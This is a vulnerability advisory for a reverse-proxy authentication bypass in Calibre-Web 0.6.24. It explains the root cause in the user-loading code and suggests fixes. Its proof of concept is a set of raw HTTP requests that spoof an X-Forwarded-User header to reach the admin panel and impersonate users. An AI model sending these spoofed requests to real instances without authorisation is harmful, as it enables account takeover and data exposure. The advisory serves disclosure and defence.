# [Security] Reverse Proxy Authentication Bypass in Calibre-Web 0.6.24

## Summary

A critical authentication bypass vulnerability exists in Calibre-Web 0.6.24 when the "Allow Reverse Proxy Authentication" feature is enabled.

The application blindly trusts a configurable HTTP header (e.g., `X-Forwarded-User`) to authenticate users without verifying the request source. An unauthenticated remote attacker can impersonate any user — including administrators — by supplying a crafted HTTP header.

---

## Affected Version

* Calibre-Web 0.6.24

---

## Vulnerability Details

| Field     | Value                                              |
| --------- | -------------------------------------------------- |
| Type      | Authentication Bypass                              |
| CWE       | CWE-287                                            |
| CVSS 3.1  | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical) |
| Component | Reverse Proxy Authentication                       |

---

## Impact

* Full authentication bypass
* Administrator account takeover
* Unauthorized access to all application functionality
* Potential data exposure and system compromise

---

## Root Cause

**File:** `cps/usermanagement.py`
**Function:** `load_user_from_reverse_proxy_header()`

The application reads a user-controlled HTTP header and directly authenticates the user without validation.

```python id="y5d7r3"
rp_header_name = config.config_reverse_proxy_login_header_name
rp_header_username = req.headers.get(rp_header_name)

if rp_header_username:
    user = ub.session.query(ub.User).filter(
        func.lower(ub.User.name) == rp_header_username.lower()
    ).first()

    if user:
        limiter.check()
        limiter.clear(user.name)
        return user
```

### Security Issues:

* No validation of request source IP (trusted proxy)
* No header stripping in middleware
* No shared secret or signature verification
* Rate limiter is cleared upon login (enables abuse)

---

## Proof of Concept

### Step 1 — Enable Reverse Proxy Authentication (Pre-condition)

Login as administrator and navigate to:

```text id="u2m9qv"
Admin → Edit Basic Configuration → Feature Configuration
```

* Enable: **Allow Reverse Proxy Authentication**
* Set header name:

```text id="q0v92a"
X-Forwarded-User
```

Click **Save**
<img width="1915" height="832" alt="image" src="https://github.com/user-attachments/assets/4fac015b-5968-4ac9-bb3e-c22a41d5c13c" />

---

### Step 2 — Log out

Logout completely and clear all session cookies.

---

### Step 3 — Authentication Bypass via Header Injection

Send a request using Burp Suite or curl:

```http id="w8l1f4"
GET / HTTP/1.1
Host: localhost:8083
X-Forwarded-User: admin
Connection: close
```

### Result:

* Application loads as authenticated user `admin`
* No password or session required
<img width="1879" height="644" alt="image" src="https://github.com/user-attachments/assets/a348a795-6ae8-4567-86c0-e93b8ae2bfd8" />

---

### Step 4 — Access Admin Panel

```http id="w3a2js"
GET /admin/view HTTP/1.1
Host: localhost:8083
X-Forwarded-User: admin
Connection: close
```

### Result:

* Server returns `200 OK`
* Full admin panel accessible

---

### Step 5 — Impersonate Any User

```http id="l9k3ds"
GET / HTTP/1.1
Host: localhost:8083
X-Forwarded-User: test
```

### Result:

* Authenticated as user `test` (if exists)
<img width="1879" height="640" alt="image" src="https://github.com/user-attachments/assets/4bf9e9e7-326b-45d1-8fb0-3b98217a0331" />

---

## Verification Matrix

| Test                                 | Result               |
| ------------------------------------ | -------------------- |
| GET / with `X-Forwarded-User: admin` | Success              |
| GET /admin/view with spoofed header  | Success              |
| GET /admin/config                    | Success              |
| Change header to another user        | Success              |
| No header                            | Redirect to login    |
| Non-existent user                    | Authentication fails |

---

## Attack Requirements

* No authentication required (when feature is enabled)
* Target must be directly accessible (not behind secured reverse proxy)

---

## CWE Classification

* CWE-287: Improper Authentication

---

## CVSS 3.1

```id="cvssx1"
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score: 9.8 (Critical)
```

---

## Suggested Fix

### 1. Restrict to Trusted Proxy IPs

```python id="fix1"
TRUSTED_PROXIES = ["127.0.0.1"]

if req.remote_addr not in TRUSTED_PROXIES:
    return None
```

---

### 2. Strip Headers in Middleware

Ensure reverse proxy headers cannot be set by external clients.

---

### 3. Add Authentication Validation

Use shared secrets or signed headers instead of trusting raw values.

---

### 4. Security Warning

Display warning in UI when enabling reverse proxy authentication.

---

## Discoverer

neitsploit1707

---

## References

* https://github.com/xuantien177
* https://github.com/janeczku/calibre-web/
